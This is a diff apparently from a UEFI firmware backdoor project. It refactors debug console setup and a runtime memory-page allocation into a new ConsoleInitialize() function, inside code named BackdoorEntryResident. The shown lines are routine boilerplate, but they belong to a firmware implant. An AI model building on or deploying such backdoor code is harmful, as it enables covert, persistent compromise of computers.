@@ -91,6 +91,40 @@ void ConsolePrint(char *Message)
     }
 }
 //--------------------------------------------------------------------------------------
+void ConsoleInitialize(void)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+    EFI_PHYSICAL_ADDRESS PagesAddr;
+
+    // initialize console I/O
+    Status = m_BS->HandleProtocol(
+        m_ST->ConsoleOutHandle,
+        &gEfiSimpleTextOutProtocolGuid, 
+        (VOID **)&m_TextOutput
+    );
+    if (Status == EFI_SUCCESS)
+    {
+        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
+        m_TextOutput->ClearScreen(m_TextOutput);
+    }
+
+    // allocate memory for pending debug output
+    Status = m_BS->AllocatePages(
+        AllocateAnyPages,
+        EfiRuntimeServicesData,
+        1, &PagesAddr
+    );
+    if (Status == EFI_SUCCESS) 
+    {
+        m_PendingOutput = (char *)PagesAddr;        
+        m_BS->SetMem(m_PendingOutput, PAGE_SIZE, 0);
+    }
+    else
+    {     
+        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
+    }
+}
+//--------------------------------------------------------------------------------------
 VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
 {
     EFI_STATUS Status = EFI_SUCCESS;
@@ -218,28 +252,10 @@ VOID BackdoorEntryResident(VOID *Image)
 {        
     VOID *Registration = NULL;
     EFI_EVENT Event = NULL;  
-    EFI_STATUS Status = EFI_SUCCESS;
-    EFI_PHYSICAL_ADDRESS PagesAddr;
 
     m_ImageBase = Image;        
 
     DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");    
-
-    // allocate memory for pending debug output
-    Status = m_BS->AllocatePages(
-        AllocateAnyPages,
-        EfiRuntimeServicesData,
-        1, &PagesAddr
-    );
-    if (Status == EFI_SUCCESS) 
-    {
-        m_PendingOutput = (char *)PagesAddr;        
-        m_BS->SetMem(m_PendingOutput, PAGE_SIZE, 0);
-    }
-    else
-    {     
-        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
-    }    
 
     // set text output protocol register notify
     RegisterProtocolNotifyDxe(
@@ -291,7 +307,6 @@ _ModuleEntryPoint(
     EFI_HANDLE ImageHandle,
     EFI_SYSTEM_TABLE *SystemTable) 
 {
-    EFI_STATUS Status = EFI_SUCCESS;    
     VOID *Image = NULL;
 
     m_ST = SystemTable;
@@ -306,17 +321,8 @@ _ModuleEntryPoint(
 
 #if defined(BACKDOOR_DEBUG)
 
-    // initialize console I/O
-    Status = m_BS->HandleProtocol(
-        SystemTable->ConsoleOutHandle,
-        &gEfiSimpleTextOutProtocolGuid, 
-        (VOID **)&m_TextOutput
-    );
-    if (Status == EFI_SUCCESS)
-    {
-        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
-        m_TextOutput->ClearScreen(m_TextOutput);
-    }
+    // initialize text output
+    ConsoleInitialize();
 
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
